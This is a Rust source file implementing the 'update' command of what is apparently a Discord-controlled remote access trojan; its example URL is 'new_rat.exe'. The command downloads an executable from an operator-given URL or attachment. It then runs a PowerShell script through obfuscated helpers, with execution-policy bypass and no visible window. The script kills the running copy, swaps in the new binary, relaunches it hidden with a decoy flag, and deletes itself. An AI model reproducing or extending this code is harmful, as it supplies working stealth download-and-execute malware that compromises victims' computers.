use crate::commands::*;
use anyhow::{Context, Result};
use async_trait::async_trait;
use std::fs;
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;

pub struct UpdateCommand;

#[async_trait]
impl BotCommand for UpdateCommand {
    fn name(&self) -> &str {
        "update"
    }
    fn description(&self) -> &str {
        "Update the bot from an attachment or URL"
    }
    fn category(&self) -> &str {
        "system"
    }
    fn usage(&self) -> &str {
        ".update <url> | .update (with attachment)"
    }
    fn examples(&self) -> &'static [&'static str] {
        &[".update https://example.com/new_rat.exe"]
    }
    fn aliases(&self) -> &'static [&'static str] {
        &["upd"]
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let url = if !msg.attachments.is_empty() {
            msg.attachments[0].url.clone()
        } else if let Some(url) = args.next() {
            url.to_string()
        } else {
            http.create_message(msg.channel_id)
                .content("Usage: `.update <url> | .update (with attachment)`")
                .await?;
            return Ok(());
        };

        self.hndl_upd(http, msg, &url).await
    }
}

impl UpdateCommand {
    // Get install path from installation module
    fn get_inst_path(&self) -> Result<PathBuf> {
        Ok(crate::installation::get_install_path())
    }

    async fn hndl_upd(&self, http: &Arc<HttpClient>, msg: &Message, url: &str) -> Result<()> {
        let status_msg = http
            .create_message(msg.channel_id)
            .content(&format!("Downloading update from `{}`...", url))
            .await?
            .model()
            .await?;

        let resp = reqwest::get(url).await.context("Failed to download file")?;
        if !resp.status().is_success() {
            http.update_message(status_msg.channel_id, status_msg.id)
                .content(Some(&format!(
                    "Download failed with status: {}",
                    resp.status()
                )))
                .await?;
            return Ok(());
        }
        let bytes = resp.bytes().await.context("Cant read file bytes")?;
        self.do_upd(bytes.to_vec())?;

        http.update_message(status_msg.channel_id, status_msg.id)
            .content(Some("**Update downloaded.** Restarting now..."))
            .await?;

        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
        process::exit(0);
    }

    fn do_upd(&self, new_exe_bytes: Vec<u8>) -> Result<()> {
        let curr_exe_path = std::env::current_exe().context("Couldnt find current exe path")?;
        let final_exe_name = curr_exe_path
            .file_name()
            .context("Cant get exe name")?
            .to_string_lossy()
            .to_string();

        let install_dir = self
            .get_inst_path()
            .context("Couldnt determine install path")?;
        fs::create_dir_all(&install_dir).ok();

        let new_exe_path = install_dir.join("upd.exe");
        fs::write(&new_exe_path, new_exe_bytes).context("Cant write new exe")?;

        let script_content = self.gen_ps_script(&curr_exe_path, &new_exe_path, &final_exe_name)?;
        let script_path = install_dir.join("u.ps1");
        fs::write(&script_path, script_content).context("Cant create update script")?;

        use crate::utils::obfuscate::{exe, powershell as ps};
        process::Command::new(exe::powershell())
            .args([
                &ps::execution_policy(),
                &ps::bypass(),
                &ps::no_profile(),
                "-File",
                &script_path.to_string_lossy(),
            ])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .spawn()
            .context("Cant run the update script")?;

        Ok(())
    }

    fn gen_ps_script(
        &self,
        old_exe: &Path,
        new_exe: &Path,
        final_exe_name: &str,
    ) -> Result<String> {
        let old_exe_path_str = old_exe.to_string_lossy().replace("'", "''");
        let new_exe_path_str = new_exe.to_string_lossy().replace("'", "''");
        let final_exe_path_str = new_exe
            .with_file_name(final_exe_name)
            .to_string_lossy()
            .replace("'", "''");

        let script = format!(
            r#"
$ErrorActionPreference = 'Stop'

$old_exe = '{old_path}'
$new_exe = '{new_path}'
$final_exe = '{final_path}'
Get-Process | Where-Object {{ $_.Path -eq $old_exe }} | Stop-Process -Force
Start-Sleep -Seconds 2

if (Test-Path $old_exe) {{
    Remove-Item -Path $old_exe -Force
}}

Move-Item -Path $new_exe -Destination $final_exe -Force

Start-Process -FilePath $final_exe -ArgumentList '--hide-decoy' -WindowStyle Hidden

Start-Sleep -Seconds 3
Remove-Item $MyInvocation.MyCommand.Path -Force
"#,
            old_path = old_exe_path_str,
            new_path = new_exe_path_str,
            final_path = final_exe_path_str,
        );

        Ok(script)
    }
}
